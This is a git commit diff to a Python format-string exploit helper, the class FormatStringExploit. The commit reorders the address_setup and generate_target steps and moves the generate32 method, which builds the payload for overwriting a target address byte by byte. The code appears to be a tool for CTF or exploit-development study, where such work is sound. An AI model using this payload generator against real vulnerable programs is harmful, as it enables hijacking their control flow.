16746cdfa641190bb12f84925f599b81f4f3cdab
Naetw <wangzhelee.cs04@g2.nctu.edu.tw>
2017-02-09 20:11:49 +0800

    Rearrange jobs of address_setup and generate_target

--- formatstring/fmtexp.py
+++ formatstring/fmtexp.py
@@ -17,21 +17,14 @@ class FormatStringExploit:
                 64 : [p64, 6]
                 }
 
-    def generate32(self):
-        adr = self.address_setup()
-        payload = self.generate_target(adr, 32)
-        adr = map(lambda x : x[1], adr)
-        payload += self.generate_fmt(adr)
-        return payload
-
     def address_setup(self, size=4):
         '''Arrange size of addres per byte for optimization'''
-        adr = [(i, self.hijack_address >> 8 * i) for i in xrange(size)]
+        adr = [(self.hijack_target + i, self.hijack_address >> 8 * i) for i in xrange(size)]
         adr = sorted(map(get_byte, adr), key=lambda x : (x[1] - 16) & 0xff)
         return adr
         
     def generate_target(self, adr, bits):
-        payload = ''.join(self.table[bits][0](self.hijack_target + i[0]) for i in adr)
+        payload = ''.join(self.table[bits][0](i[0]) for i in adr)
         FormatStringExploit.printed += self.table[bits][1] * (bits / 8)
         return payload
 
@@ -45,6 +38,12 @@ class FormatStringExploit:
             FormatStringExploit.printed += pad
         return payload
 
+    def generate32(self):
+        adr = self.address_setup()
+        payload = self.generate_target(adr, 32)
+        adr = map(lambda x : x[1], adr)
+        payload += self.generate_fmt(adr)
+        return payload
 
     def size(self):
         '''Return already printed words'''
